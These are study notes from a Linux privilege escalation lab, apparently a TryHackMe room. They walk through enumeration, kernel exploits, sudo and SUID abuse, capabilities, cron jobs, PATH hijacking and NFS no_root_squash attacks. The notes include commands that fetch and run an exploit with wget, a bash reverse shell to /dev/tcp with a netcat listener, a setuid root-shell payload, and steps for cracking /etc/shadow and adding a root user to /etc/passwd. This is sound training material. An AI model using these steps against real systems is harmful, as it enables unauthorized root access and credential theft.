## Enumeration

### hostname
The `hostname` command will return the hostname of the target machine.
### uname -a
Will print system information giving us additional detail about the kernel used by the system.
### /proc/version
Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
### /etc/issue
Operating Systems can also be identified by looking at the `/etc/issue` file.
### ps Command
Typing `ps` on your terminal will show processes for the current shell.

The output of the `ps` (Process Status) will show the following;
- PID: The process ID (unique to the process)
- TTY: Terminal type used by the user
- Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
- CMD: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.
- `ps -A`: View all running processes
- `ps axjf`: View process tree (see the tree formation until `ps axjf` is run below)
![](https://assets.tryhackme.com/additional/imgur/xsbohSd.png)
- `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.
### env
The `env` command will show environmental variables.
![](https://assets.tryhackme.com/additional/imgur/LWdJ8Fw.png)
The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
### sudo -l
The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.
### ls
While looking for potential privilege escalation vectors, please remember to always use the `ls` command with the `-la` parameter. The example below shows how the “secret.txt” file can easily be missed using the `ls` or `ls -l` commands.
![](https://assets.tryhackme.com/additional/imgur/2jOtOat.png)

### Id
The `id` command will provide a general overview of the user’s privilege level and group memberships.
It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.
![](https://assets.tryhackme.com/additional/imgur/YzfJliG.png)

### /etc/passwd

Reading the `/etc/passwd` file can be an easy way to discover users on the system.
![](https://assets.tryhackme.com/additional/imgur/r6oYOEi.png)

While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.
![](https://assets.tryhackme.com/additional/imgur/cpS2U93.png)
Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.
![](https://assets.tryhackme.com/additional/imgur/psxE6V4.png)


### history
Looking at earlier commands with the `history` command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

### ifconfig
The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.
![](https://assets.tryhackme.com/additional/imgur/hcdZnwK.png)

This can be confirmed using the `ip route` command to see which network routes exist.
![](https://assets.tryhackme.com/additional/imgur/PSrmz5O.png)

### netstat
Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.

- `netstat -a`: shows all listening ports and established connections.
- `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
- `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
![](https://assets.tryhackme.com/additional/imgur/BbLdyrr.png)

- `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.
![](https://assets.tryhackme.com/additional/imgur/mc8OWP0.png)

- `netstat -tp`: list connections with the service name and PID information.
![](https://assets.tryhackme.com/additional/imgur/fDYQwbW.png)

This can also be used with the `-l` option to list listening ports (below)
![](https://assets.tryhackme.com/additional/imgur/JK7DNv0.png)

We can see the “PID/Program name” column is empty as this process is owned by another user.

Below is the same command run with root privileges and reveals this information as 2641/nc (netcat)

![](https://assets.tryhackme.com/additional/imgur/FjZHqlY.png)

- `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

![](https://assets.tryhackme.com/additional/imgur/r6IjpmZ.png)

The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;
- `-a`: Display all sockets
- `-n`: Do not resolve names
- `-o`: Display timers

![](https://assets.tryhackme.com/additional/imgur/UxzLBRw.png)

### find Command

**Find files:**
- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.
![](https://assets.tryhackme.com/additional/imgur/pSMfoz4.png)

The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below).
![](https://assets.tryhackme.com/additional/imgur/UKYSdE3.png)

Folders and files that can be written to or executed from:
- `find / -writable -type d 2>/dev/null` : Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders

The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.
![](https://assets.tryhackme.com/additional/imgur/qb0klHH.png)  
- `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders

Find development tools and supported languages:
- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

Find specific file permissions:
Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.
- `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
**Breakdown (piece by piece):**
- `find /` — start searching from the root directory (`/`), i.e. the whole system.
    
- `-perm -u=s` — match files where the **user SUID** bit is set.
    
- `-type f` — only look for regular files (not directories, sockets, etc.).
    
- `2>/dev/null` — hide error messages (permission denied, etc.) so the output is cleaner.

### What version of the Python language is installed on the system?

**This can be found by running the **_python --version_** or **_python3 --version_**

### What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)  
**Referring back to question 2, we can do a quick search of the kernel version on [ExploitDB](https://www.exploit-db.com/).


## Automated Enumeration Tools

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

## Kernel Exploits

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

The Kernel exploit methodology is simple;
1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

**Research sources:**  
1. Based on your findings, you can use Google to search for an existing exploit code.
2. Sources such as [https://www.cvedetails.com/](https://www.cvedetails.com/) can also be useful.

```
ON ATTACKER
go to exploit website and download 'c' code
└─# ls              
37292.c
└─# mv 37292.c ofs.c
└─# gcc ofs.c -o ofs
└─# sudo python3 -m http.server

ON VICTIM
pwd
cd /tmp
wget 10.201.118.161:8000/ofs.c
chmod +x ofs
./ofs
id

```

## Sudo

How many programs can the user run on the target system with sudo rights?
```
sudo -l
```

[https://gtfobins.github.io/](https://gtfobins.github.io/) provides information on how any program, on which you may have sudo rights, can be used.

```
^R^X -> means crtl+r then ctrl+x
```

How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
sudo nmap --interactive
## SUID

```
find / -type f -perm -04000 -ls 2>/dev/null
2>/dev/null -> remove unneceasry information
```

**SUID (set-user-ID)**: when a program has the SUID bit, it runs **with the file owner's user privileges** (often `root`) no matter who launches it.

**SGID (set-group-ID)**: when set, the program runs **with the file’s group privileges**.

These are special permission bits you see as an **`s`** in the permission string.
### How it looks in `ls -l`
- Normal execute bit for owner: `-rwxr-xr-x`
- Owner has SUID instead of `x`: `-rwsr-xr-x` ← **note the `s` in owner**
- Group has SGID instead of `x`: `-rwxr-sr-x` ← **note the `s` in group**

If you see a lowercase `s` it means execute + set bit; an uppercase `S` means the set bit is set but execute is not.

![Pasted image 20251014190653.png](attachments/Pasted%20image%2020251014190653.png)
### Why it matters
- SUID programs can be used to **escalate privileges** if misconfigured. For example, a root-owned SUID binary that is writable or has bugs could let a normal user run commands as root.

### Find SUID/SGID files (commands)

- Find **SUID** files:
`find / -type f -perm -04000 -ls 2>/dev/null`

- Find **SGID** files:
`find / -type f -perm -02000 -ls 2>/dev/null`

- Find **either SUID or SGID**:
`find / -type f \( -perm -04000 -o -perm -02000 \) -ls 2>/dev/null`

`2>/dev/null` just hides permission-denied errors.

### Quick safety note

- SUID/SGID are normal for some system programs (e.g., `passwd`). Only worry about **unusual** SUID/SGID files or those in writable locations — they can be privilege-escalation risks.
- The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has.

https://gtfobins.github.io/#+suid

### Other way

At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.  
  
Below are simple steps using both vectors.  
  
reading the `/etc/shadow` file  
  
We see that the nano text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command.

`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.

![](https://assets.tryhackme.com/additional/imgur/DAWxbJD.png)

The unshadow tool’s usage can be seen below;  
`unshadow passwd.txt shadow.txt > passwords.txt`  

![](https://assets.tryhackme.com/additional/imgur/6cHBAr1.png)

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext.

### other way 2

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking.

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

![](https://assets.tryhackme.com/additional/imgur/bkOGaHY.png)  

We will then add this password with a username to the `/etc/passwd` file.

![](https://assets.tryhackme.com/additional/imgur/huGoEtj.png)

Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.

![](https://assets.tryhackme.com/additional/imgur/HZcWGhi.png)


## Capabilities

### What are Linux capabilities? (one line)

Capabilities let you give **specific privileges** to a program instead of giving it full root power.

### Why use them? (very short)

- Instead of making a program run as root (SUID), you can give it only the capabilities it needs (e.g., open low ports, use raw sockets).
    
- Safer: limits what the program can do even if it’s compromised.

### Examples of capabilities

- `cap_net_bind_service` — bind to ports <1024 (like 80 or 443).
    
- `cap_net_raw` — use raw sockets (packet capture, ping).
    
- `cap_sys_admin` — VERY powerful (lots of admin abilities).
    

### How to **see** capabilities (easy)

- Check a specific file:
    

`getcap /usr/bin/ping # prints something like: /usr/bin/ping = cap_net_raw+ep`

- Find files with capabilities (search whole FS; hide errors):
    

`getcap -r / 2>/dev/null`

### How to **give** a capability (example)

`sudo setcap cap_net_raw+ep /path/to/binary`

- `+e` = enable, `+p` = permitted. (`cap_net_raw+ep` is common for ping.)
    
- Use `sudo getcap /path/to/binary` to verify it was set.
    

### How to **remove** a capability

`sudo setcap -r /path/to/binary`

### Example

We can use the `getcap` tool to list enabled capabilities.
![](https://assets.tryhackme.com/additional/imgur/Q6XYr0p.png)

When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.  
  
Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.
![](https://assets.tryhackme.com/additional/imgur/6csoabB.png)

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.  
  
We notice that vim can be used with the following command and payload:    
![](https://assets.tryhackme.com/additional/imgur/nlpCMWj.png)  

/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

This will launch a root shell as seen below;
![](https://assets.tryhackme.com/additional/imgur/jCjvgo3.png)

## Cron Jobs

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user.

The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.  
  
Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

![Pasted image 20251018012219.png](attachments/Pasted%20image%2020251018012219.png)

![Pasted image 20251018012227.png](attachments/Pasted%20image%2020251018012227.png)

put in .sh file in correct folderin users home directory
```
#!/bin/bash
bash -i >& /dev/tcp/10.48.119.39/8080 0>&1

## nc -nlvp 8080 (start listener)
```

john the ripper
```
cat /etc/shadow

john --wordlist=/usr/share/wordlists/rockyou.txt matt.txt
```
## PATH

PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).  
  
Typically the PATH will look like this:

![](https://assets.tryhackme.com/additional/imgur/ch2Z4zp.png)

If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm.

be sure you can answer the questions below before trying this.
1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

![Pasted image 20251019213506.png](attachments/Pasted%20image%2020251019213506.png)
- `setuid(0)` and `setgid(0)` make the process run with **root user and group IDs** (0 = root).
- `system("thm")` asks the shell to run the command `thm`.
So when this program runs, it becomes **root** and then asks the shell to run `thm`.

![Pasted image 20251019214113.png](attachments/Pasted%20image%2020251019214113.png)

**`gcc`** → This is the GNU C Compiler — it compiles C programs.
**`-o path`** → This tells the compiler to **output** the compiled program as a file named `path`.

“**Compiles**” means the computer takes your human-readable code and turns it into machine-readable instructions.
In this case:
- Your file **`path_exp.c`** is written in **C language**, which humans can read.
    
- The **`gcc` compiler** translates that C code into binary (0s and 1s) that the computer’s CPU understands.
    
- The result is an **executable file** (called `path`) that you can **run** directly.

Before running:
`path_exp.c   ← your code (text file)`

After running:
`path_exp.c   ← still there path         ← new compiled program (you can now run it with ./path)`

Our user now has access to the “path” script with SUID bit set.

`chmod u+s path`

- **What it does:** sets the **SUID** bit on `path`.
    
- **SUID meaning (very short):** when anyone runs `./path`, it runs **with the privileges of the file owner** (not the person who ran it). If the owner is `root`, the program runs as root.


Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege

A simple search for writable folders can done using the “`find / -writable 2>/dev/null`” command. The output of this command can be cleaned using a simple cut and sort sequence.  

![](https://assets.tryhackme.com/additional/imgur/7UekB3t.png)

Comparing this with PATH will help us find folders we could use.
![](https://assets.tryhackme.com/additional/imgur/67mdmmG.png)  

We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders.

![](https://assets.tryhackme.com/additional/imgur/Y3pDsrL.png)  

An alternative could be the command below.
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`

We have added “grep -v proc” to get rid of the many results related to running processes.
Unfortunately, subfolders under /usr are not writable

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.![](https://assets.tryhackme.com/additional/imgur/u1PM8ZD.png)

At this point the path script will also look under the /tmp folder for an executable named “thm”.
Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.
![](https://assets.tryhackme.com/additional/imgur/7UdrEnd.png)  

Simple — here’s exactly what running the line `/bin/bash` does, in plain language.

- `/bin/bash` is the full path to the Bash shell program.
    
- Running `/bin/bash` starts a **new interactive Bash shell** (another command prompt).
    

How that behaves depends on who runs it:

- If **you** run `/bin/bash` as your normal user, the new shell runs with **your** user privileges.
    
- If some program running as **root** runs `/bin/bash` (like your SUID `path` program did), the new shell runs as **root** — so you get a root shell.

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.
![](https://assets.tryhackme.com/additional/imgur/MlBJ8kb.png)


![Pasted image 20251020021933.png](attachments/Pasted%20image%2020251020021933.png)



## NFS

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

![](https://assets.tryhackme.com/additional/imgur/irDQTze.png)

### Key terms (plain)

- **NFS**: Network File System — lets one machine share folders with others over the network.
    
- **/etc/exports**: file on the NFS server that lists what folders are shared and with what options.
    
- **root_squash (default)**: maps remote root to a low-privilege user (`nfsnobody`) so root on a client does **not** become root on the server.
    
- **no_root_squash**: disables that mapping — root on the client _is_ root on the server for that share. Dangerous if the share is writable.

### Why `no_root_squash` is dangerous (simple)

- If a share is writable and `no_root_squash` is set, someone who can create files in that share (from a client where they are root) can:
    
    1. create a binary or script,
        
    2. set its owner to `root`,
        
    3. set the SUID bit (`chmod 4755 file`),
        
    4. then the server (or anyone executing that file on the server) will run it with root privileges.


We will start by enumerating mountable shares from our attacking machine.

![](https://assets.tryhackme.com/additional/imgur/CmXPDcv.png)
**What it does:** asks the remote machine (10.0.2.12) “what folders are you sharing via NFS?”
- Each line is a shared directory the server is exporting.
- The `*` means “exported to everyone” (no host restriction).
- **Why do this:** to find writable shares you might be able to mount.

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
![](https://assets.tryhackme.com/additional/imgur/DwAB1qs.png)

`mkdir /tmp/backupsonattackermachine`
- **What it does:** creates a local directory on *your* attacking machine to use as a mount point.
- **Why:** you need an empty folder where the remote share will appear after mounting.
`mount -o rw 10.0.2.12:/backups /tmp/backupsonattackermachine`
- **What it does:** mounts the remote NFS share `/backups` from 10.0.2.12 onto your local folder `/tmp/backupsonattackermachine`.
- **`-o rw`** means mount it **read-write** (so you can create files there).
- **After this:** the files in the remote `/backups` appear under `/tmp/backupsonattackermachine` on *your* machine — you can read and (if permitted) write to them as if they were local.

As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.
![](https://assets.tryhackme.com/additional/imgur/nWKpFkK.png)  

Once we compile the code we will set the SUID bit.
![](https://assets.tryhackme.com/additional/imgur/rkZOOjZ.png)  

You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).
![](https://assets.tryhackme.com/additional/imgur/U7IjT38.png)

